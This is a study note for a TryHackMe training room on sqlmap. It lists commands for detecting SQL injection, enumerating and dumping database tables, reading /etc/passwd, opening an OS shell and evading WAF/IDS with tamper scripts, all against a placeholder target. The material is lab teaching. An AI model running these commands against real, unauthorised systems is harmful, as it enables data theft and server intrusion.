---
tags: [THM, cyber-security-101, offensive-tooling, SQLMap, SQLi, room]
platform: TryHackMe
type: room
module: "09 - Offensive Security Tooling"
module_number: 9
room_number: 37
status: "⬜"
url: https://tryhackme.com/room/sqlmapthebasics
difficulty: Easy
---

# 🗺️ SQLMap: The Basics

> [!abstract] Summary
> Learn SQLMap — automated SQL injection detection and exploitation. Enumerate databases, dump tables, and in some cases achieve OS-level access.

**Path:** [[Cyber Security 101]] > Module 9 > SQLMap: The Basics

## 🎯 Learning Objectives
- Use SQLMap to detect SQL injection vulnerabilities
- Enumerate databases, tables, and columns
- Dump database contents
- Use SQLMap with Burp requests

## 📖 Key Concepts

### Basic Usage
```bash
# Test URL parameter
sqlmap -u "http://target.com/page?id=1"

# Test POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use saved Burp request (recommended)
sqlmap -r request.txt

# Batch mode (no prompts)
sqlmap -u "http://target.com/page?id=1" --batch
```

### Database Enumeration
```bash
sqlmap -u "URL" --dbs                          # List databases
sqlmap -u "URL" -D dbname --tables             # List tables
sqlmap -u "URL" -D dbname -T users --columns   # List columns
sqlmap -u "URL" -D dbname -T users --dump      # Dump table
```

### Options
```bash
--level=3 --risk=2      # More aggressive testing
--dbms=mysql            # Specify DBMS
--proxy=http://127.0.0.1:8080   # Route through Burp
--tamper=space2comment  # Obfuscation for WAF bypass
```

### Advanced
```bash
sqlmap -u "URL" --file-read=/etc/passwd        # Read server files
sqlmap -u "URL" --os-shell                     # OS shell (if available)
```

### Saving a Burp Request
1. Intercept in Burp → Right-click → Save Item → `request.txt`
2. `sqlmap -r request.txt --batch`

> [!warning] SQLMap is noisy — it sends many unusual requests and will trigger WAF/IDS. Use `--tamper` scripts for evasion. In real engagements, manual SQLi testing first; SQLMap only for confirmed vulnerabilities.

## 🔑 Key Takeaways
- `-r request.txt` from Burp is the cleanest way to test complex requests
- `--dbs → --tables → --columns → --dump` is the standard enumeration chain
- SQLMap automates exploitation but is easily detected
- `--batch` suppresses interactive prompts — useful for scripting

## 🔗 Related Notes
- [[CS101-32 - SQL Fundamentals]] · [[CS101-33 - Burp Suite The Basics]]
- [[SQL Injection]] · [[SQLMap]] · [[Database Enumeration]]
